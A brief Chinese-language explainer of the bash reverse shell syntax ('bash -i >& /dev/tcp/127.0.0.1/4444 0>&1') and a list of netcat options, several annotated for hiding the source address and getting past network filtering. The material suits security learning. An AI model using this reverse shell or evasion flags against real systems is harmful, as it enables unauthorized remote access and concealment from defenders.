bash -i表示以交互模式运行bash shell ，文件描述符号>&其意义为重定向如果其后为文件则将bash shell交互模式传递给文件， bash -i >&是bash shell以交互模式运行并传递给文件。/dev/tcp/127.0.0.1/4444表示传递给远程主机的ip地址和端口

文件描述符： 0 标准输入 1 标准输出 2 错误输入输出

命令中的 0>&1 表示将标准输入重定向到标准输出，实现远程的输入可以在远程输出对应内容。

help

-d 脱离窗口 后台运行

-e 执行某个程序

-G geteway 设置网关，常用于突破内网限制

-g num 路由跳数

-i sec 设置发送每行数据的时间间隔秒

-l 设置netcat监听状态等待连接

-L 一直监听客户端断开进入等待

-n 设置netcat只识别ip地址，不在进行dns解析

-o file 设置传输十六进制数据

-p 设置监听端口号

-r 设置netcat 随机监听

-s addr 设置netcat源地址 可设置其他地址隐藏自己

-t 回复telnet的请求回复包

-u 使用udp模式（默认使用tcp协议）当tcp连接被过滤可绕过

-v 显示版本信息等

-w 设置连接超时值 （秒）

-z zero扫描模式不包含payload 缩短扫描时间
